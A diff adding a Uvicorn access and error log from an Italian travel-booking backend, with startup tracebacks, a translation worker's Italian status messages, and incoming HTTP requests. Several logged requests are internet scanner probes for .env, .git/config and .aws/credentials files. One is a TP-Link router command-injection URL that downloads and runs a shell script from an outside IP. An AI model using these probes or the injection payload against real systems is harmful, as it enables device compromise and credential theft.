@@ -1,0 +1,680 @@
+INFO:     Will watch for changes in these directories: ['/var/thinktravel/backend/ThinkTravel-BackendPy']
+INFO:     Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)
+INFO:     Started reloader process [249676] using StatReload
+ERROR:    Error loading ASGI app. Could not import module "main".
+INFO:     Will watch for changes in these directories: ['/var/thinktravel/backend/ThinkTravel-BackendPy']
+INFO:     Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)
+INFO:     Started reloader process [249691] using StatReload
+Process SpawnProcess-1:
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/multiprocessing/process.py", line 314, in _bootstrap
+    self.run()
+  File "/usr/lib/python3.12/multiprocessing/process.py", line 108, in run
+    self._target(*self._args, **self._kwargs)
+  File "/var/thinktravel/backend/ThinkTravel-BackendPy/venv/lib/python3.12/site-packages/uvicorn/_subprocess.py", line 80, in subprocess_started
+    target(sockets=sockets)
+  File "/var/thinktravel/backend/ThinkTravel-BackendPy/venv/lib/python3.12/site-packages/uvicorn/server.py", line 66, in run
+    return asyncio.run(self.serve(sockets=sockets))
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/asyncio/runners.py", line 194, in run
+    return runner.run(main)
+           ^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/asyncio/runners.py", line 118, in run
+    return self._loop.run_until_complete(task)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/asyncio/base_events.py", line 687, in run_until_complete
+    return future.result()
+           ^^^^^^^^^^^^^^^
+  File "/var/thinktravel/backend/ThinkTravel-BackendPy/venv/lib/python3.12/site-packages/uvicorn/server.py", line 70, in serve
+    await self._serve(sockets)
+  File "/var/thinktravel/backend/ThinkTravel-BackendPy/venv/lib/python3.12/site-packages/uvicorn/server.py", line 77, in _serve
+    config.load()
+  File "/var/thinktravel/backend/ThinkTravel-BackendPy/venv/lib/python3.12/site-packages/uvicorn/config.py", line 435, in load
+    self.loaded_app = import_from_string(self.app)
+                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/thinktravel/backend/ThinkTravel-BackendPy/venv/lib/python3.12/site-packages/uvicorn/importer.py", line 22, in import_from_string
+    raise exc from None
+  File "/var/thinktravel/backend/ThinkTravel-BackendPy/venv/lib/python3.12/site-packages/uvicorn/importer.py", line 19, in import_from_string
+    module = importlib.import_module(module_str)
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/importlib/__init__.py", line 90, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "<frozen importlib._bootstrap>", line 1387, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 1360, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 1331, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 935, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 995, in exec_module
+  File "<frozen importlib._bootstrap>", line 488, in _call_with_frames_removed
+  File "/var/thinktravel/backend/ThinkTravel-BackendPy/app/main.py", line 4, in <module>
+    from app.routers.locations import locations_router
+  File "/var/thinktravel/backend/ThinkTravel-BackendPy/app/routers/locations/__init__.py", line 2, in <module>
+    from .country import router as country_router
+  File "/var/thinktravel/backend/ThinkTravel-BackendPy/app/routers/locations/country.py", line 2, in <module>
+    from app.controllers.locations import get_all_countries, get_country_by_id, get_all_countries_names, get_country_images
+  File "/var/thinktravel/backend/ThinkTravel-BackendPy/app/controllers/locations/__init__.py", line 2, in <module>
+    from .city import *
+  File "/var/thinktravel/backend/ThinkTravel-BackendPy/app/controllers/locations/city.py", line 6, in <module>
+    from googletrans import Translator
+ModuleNotFoundError: No module named 'googletrans'
+INFO:     Will watch for changes in these directories: ['/var/thinktravel/backend/ThinkTravel-BackendPy']
+INFO:     Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)
+INFO:     Started reloader process [249751] using StatReload
+INFO:     Started server process [249753]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     Will watch for changes in these directories: ['/var/thinktravel/backend/ThinkTravel-BackendPy']
+ERROR:    [Errno 98] Address already in use
+INFO:     Stopping reloader process [249676]
+INFO:     Stopping reloader process [249691]
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [249753]
+INFO:     Stopping reloader process [249751]
+INFO:     Will watch for changes in these directories: ['/var/thinktravel/backend/ThinkTravel-BackendPy']
+INFO:     Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)
+INFO:     Started reloader process [249873] using StatReload
+INFO:     Started server process [249875]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [249875]
+INFO:     Stopping reloader process [249873]
+INFO:     Will watch for changes in these directories: ['/var/thinktravel/backend/ThinkTravel-BackendPy']
+INFO:     Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)
+INFO:     Started reloader process [250042] using StatReload
+INFO:     Started server process [250044]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+Avvio del worker di traduzione...
+Worker di traduzione avviato in un thread separato.
+Translation worker avviato
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     213.144.71.162:51309 - "GET /edmondo HTTP/1.1" 200 OK
+INFO:     213.144.71.162:51309 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [250044]
+INFO:     Stopping reloader process [250042]
+INFO:     Will watch for changes in these directories: ['/var/thinktravel/backend/ThinkTravel-BackendPy']
+INFO:     Uvicorn running on http://0.0.0.0:80 (Press CTRL+C to quit)
+INFO:     Started reloader process [250052] using StatReload
+INFO:     Started server process [250054]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+Avvio del worker di traduzione...
+Worker di traduzione avviato in un thread separato.
+Translation worker avviato
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     5.90.125.224:22539 - "GET /edmondo HTTP/1.1" 200 OK
+INFO:     185.218.84.178:34912 - "GET / HTTP/1.1" 200 OK
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     109.53.112.199:7669 - "GET /giraudo HTTP/1.1" 200 OK
+INFO:     109.53.112.199:7668 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     109.53.112.199:7432 - "GET /edmondo HTTP/1.1" 200 OK
+INFO:     213.144.71.162:56279 - "GET / HTTP/1.1" 200 OK
+INFO:     165.154.206.35:34556 - "GET /version HTTP/1.1" 404 Not Found
+INFO:     165.154.206.35:35130 - "GET / HTTP/1.1" 200 OK
+INFO:     165.154.206.35:35330 - "GET / HTTP/1.1" 200 OK
+INFO:     165.154.206.35:35486 - "GET /v1 HTTP/1.1" 404 Not Found
+INFO:     165.154.206.35:35544 - "GET / HTTP/1.1" 200 OK
+INFO:     37.53.86.43:46313 - "GET / HTTP/1.0" 200 OK
+INFO:     213.144.71.162:56296 - "GET /giraudo HTTP/1.1" 200 OK
+INFO:     146.75.186.14:28336 - "GET /ghi HTTP/1.1" 200 OK
+INFO:     146.75.186.14:28336 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     106.75.143.53:17250 - "GET / HTTP/1.1" 200 OK
+INFO:     106.75.143.53:17284 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     213.144.71.162:52726 - "GET /ghi HTTP/1.1" 200 OK
+INFO:     213.144.71.162:52754 - "GET /giraudo HTTP/1.1" 200 OK
+INFO:     185.218.86.4:47684 - "GET / HTTP/1.1" 200 OK
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     154.81.156.35:57954 - "GET / HTTP/1.1" 200 OK
+INFO:     213.144.71.162:51677 - "GET /ghi HTTP/1.1" 200 OK
+INFO:     213.144.71.162:51680 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     213.144.71.162:51705 - "GET /ghi HTTP/1.1" 200 OK
+INFO:     213.144.71.162:51706 - "GET /ghi HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     195.184.76.141:51827 - "GET / HTTP/1.1" 200 OK
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     213.144.71.162:47356 - "GET /edmondo HTTP/1.1" 200 OK
+INFO:     213.144.71.162:47358 - "GET /edmondo HTTP/1.1" 200 OK
+INFO:     176.65.148.10:39384 - "GET / HTTP/1.1" 200 OK
+INFO:     195.184.76.169:55023 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     213.144.71.162:41586 - "GET /giraudo HTTP/1.1" 200 OK
+INFO:     151.44.9.209:31701 - "GET /edmondo HTTP/1.1" 200 OK
+INFO:     213.144.71.162:42914 - "GET /edmondo HTTP/1.1" 200 OK
+INFO:     213.144.71.162:45968 - "GET /edmondo HTTP/1.1" 200 OK
+INFO:     213.144.71.162:39954 - "GET /edmondo HTTP/1.1" 200 OK
+INFO:     93.174.93.12:60000 - "GET / HTTP/1.0" 200 OK
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     213.144.71.162:50015 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     154.81.156.7:52550 - "GET / HTTP/1.1" 200 OK
+INFO:     45.33.109.17:33872 - "GET / HTTP/1.1" 200 OK
+INFO:     151.34.245.95:26068 - "GET /edmondo HTTP/1.1" 200 OK
+INFO:     149.154.161.248:57998 - "GET /edmondo HTTP/1.1" 200 OK
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     151.34.245.95:26097 - "GET /edmondo HTTP/1.1" 200 OK
+INFO:     151.34.245.95:26098 - "GET /edmondo HTTP/1.1" 200 OK
+INFO:     176.65.148.243:36340 - "POST /boaform/admin/formLogin HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     151.44.82.170:64047 - "GET /edmondo HTTP/1.1" 200 OK
+INFO:     151.44.82.170:64047 - "GET /edmondo HTTP/1.1" 200 OK
+INFO:     185.218.84.178:58102 - "GET / HTTP/1.1" 200 OK
+INFO:     109.53.100.236:14987 - "GET /edmondo HTTP/1.1" 200 OK
+INFO:     109.53.100.236:14986 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     109.53.100.236:14988 - "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 Not Found
+INFO:     109.53.100.236:14989 - "GET /apple-touch-icon.png HTTP/1.1" 404 Not Found
+INFO:     109.53.100.236:14990 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     193.207.99.255:49427 - "GET /giraudo HTTP/1.1" 200 OK
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     213.144.71.162:43176 - "GET /ghi HTTP/1.1" 200 OK
+INFO:     151.36.231.186:28028 - "GET /ghi HTTP/1.1" 200 OK
+INFO:     128.199.85.181:45606 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     128.199.85.181:45610 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     213.144.71.162:50199 - "GET /edmondo HTTP/1.1" 200 OK
+INFO:     213.144.71.162:65506 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     213.144.71.162:50205 - "GET /edmondo HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     45.148.10.97:41438 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     45.148.10.97:41454 - "GET / HTTP/1.1" 200 OK
+INFO:     45.148.10.97:41458 - "GET /.env.backup HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41466 - "GET /.env.ci HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41470 - "GET /.env.dev.local HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41484 - "GET /.env.template HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41492 - "GET /assets../.git/config HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41494 - "GET /data/.git/config HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41498 - "GET /.env.testing.local HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41512 - "GET /project/.git/config HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41518 - "GET /api/.env HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41532 - "GET /server/.git/config HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41534 - "GET /media/.git/config HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41536 - "GET /.env.qa HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41538 - "GET /configuration/.env HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41540 - "GET /.env.uat HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41556 - "GET /config.json HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41570 - "GET /.env.secret HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41582 - "GET /prod/.env HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41586 - "GET /files/.git/config HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41596 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41602 - "GET /api/.git/config HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41614 - "GET /.env.dist HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41616 - "GET /.env.staging.local HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41626 - "GET /www/.git/config HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41630 - "GET /.env.save HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41632 - "GET /config/.env HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41638 - "GET /public/.git/config HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41654 - "GET /.env.bak HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41664 - "GET /.env.config HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41672 - "GET /.env.development.local HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41680 - "GET /.env.testing HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41696 - "GET /app/.git/config HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41710 - "GET /dev/.git/config HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41724 - "GET /.env.prod HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41730 - "GET /admin/.git/config HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41746 - "GET /.aws/credentials HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41754 - "GET /.env.dev HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41756 - "GET /.env.production.local HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41764 - "GET /build/.env HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41774 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41786 - "GET /.env.sandbox HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41790 - "GET /.env.test HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41796 - "GET /backup/.git/config HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41812 - "GET /.env.default HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41824 - "GET /.env.production HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41826 - "GET /.env_sample HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41836 - "GET /media../.git/config HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41846 - "GET /.envrc HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41852 - "GET /static../.git/config HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41860 - "GET /docker-compose.prod.yml HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41872 - "GET /.env.live HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41876 - "GET /.env.local HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41888 - "GET /.env.preprod HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41890 - "GET /.env.stage HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41898 - "GET /core/.git/config HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41900 - "GET /src/.git/config HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41902 - "GET /.env.prod.local HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41906 - "GET /settings/.env HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41918 - "GET /cms/.git/config HTTP/1.1" 404 Not Found
+INFO:     45.148.10.97:41934 - "GET /config/.git/config HTTP/1.1" 404 Not Found
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     154.81.156.35:57964 - "GET / HTTP/1.1" 200 OK
+INFO:     45.95.147.209:54692 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+sh%3B+wget+http%3A%2F%2F212.81.47.226%2Fsh%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+sh%60) HTTP/1.1" 404 Not Found
+INFO:     3.20.232.228:50042 - "GET / HTTP/1.1" 200 OK
+INFO:     3.20.232.228:47280 - "GET / HTTP/1.1" 200 OK
+INFO:     37.160.59.124:11743 - "GET /giraudo HTTP/1.1" 200 OK
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     185.218.86.4:52204 - "GET / HTTP/1.1" 200 OK
+INFO:     109.118.127.10:6486 - "GET /edmondo HTTP/1.1" 200 OK
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     45.80.158.152:61224 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     45.80.158.152:50303 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     3.144.240.170:41668 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     93.174.93.12:60000 - "GET / HTTP/1.0" 200 OK
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     185.218.84.178:54558 - "GET / HTTP/1.1" 200 OK
+INFO:     154.81.156.35:39924 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     154.81.156.7:40512 - "GET / HTTP/1.1" 200 OK
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     185.218.86.4:41624 - "GET / HTTP/1.1" 200 OK
+INFO:     206.168.34.80:49442 - "GET / HTTP/1.1" 200 OK
+INFO:     206.168.34.80:49466 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     206.168.34.80:49482 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     206.168.34.80:41682 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     85.208.84.69:36324 - "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 OK
+INFO:     220.82.166.157:63949 - "GET / HTTP/1.0" 200 OK
+INFO:     185.242.226.154:56303 - "GET / HTTP/1.1" 200 OK
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     196.251.81.194:51628 - "GET /.env HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     85.208.84.69:49092 - "GET /actuator/gateway/routes HTTP/1.1" 404 Not Found
+INFO:     45.156.129.46:52525 - "GET / HTTP/1.1" 200 OK
+INFO:     185.218.84.178:51598 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     3.238.118.143:50844 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     45.80.158.251:63254 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     198.235.24.240:50887 - "GET / HTTP/1.0" 200 OK
+WARNING:  Invalid HTTP request received.
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     176.65.148.243:34230 - "POST /boaform/admin/formLogin HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     5.90.170.93:27834 - "GET /edmondo HTTP/1.1" 200 OK
+INFO:     218.31.112.75:16622 - "GET / HTTP/1.1" 200 OK
+INFO:     185.218.86.4:49782 - "GET / HTTP/1.1" 200 OK
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     45.80.158.251:52763 - "GET /.env HTTP/1.1" 404 Not Found
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     141.98.11.27:50240 - "GET / HTTP/1.1" 200 OK
+INFO:     80.82.77.202:60000 - "GET / HTTP/1.0" 200 OK
+INFO:     104.10.248.211:60831 - "GET / HTTP/1.0" 200 OK
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     176.65.148.243:58316 - "POST /boaform/admin/formLogin HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     45.80.158.251:57444 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     154.81.156.7:35160 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     195.184.76.74:36399 - "GET / HTTP/1.1" 200 OK
+INFO:     192.155.90.118:40644 - "GET / HTTP/1.1" 200 OK
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     195.184.76.159:41655 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     41.142.94.168:40875 - "GET /r.php HTTP/1.1" 404 Not Found
+INFO:     87.236.176.88:54661 - "GET / HTTP/1.1" 200 OK
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+Fine del ciclo di traduzione, attendo 30 minuti...
+Inizio del ciclo di traduzione...
+Nessun hotel da tradurre per la lingua it.
+Nessun hotel da tradurre per la lingua de.
+Nessun hotel da tradurre per la lingua zh-cn.
+Nessun hotel da tradurre per la lingua fr.
+Nessun hotel da tradurre per la lingua es.
+INFO:     162.216.150.107:61700 - "GET / HTTP/1.1" 200 OK
+INFO:     115.231.78.11:30000 - "GET / HTTP/1.1" 200 OK
+INFO:     115.231.78.11:31879 - "GET / HTTP/1.1" 200 OK
+INFO:     115.231.78.11:32069 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     115.231.78.11:32243 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     47.251.15.21:44165 - "GET / HTTP/1.1" 200 OK
+INFO:     47.254.25.10:35295 - "GET /Public/home/js/check.js HTTP/1.1" 404 Not Found
+INFO:     47.251.14.232:53957 - "GET /static/admin/javascript/hetong.js HTTP/1.1" 404 Not Found
+INFO:     20.65.193.121:48736 - "GET / HTTP/1.1" 200 OK
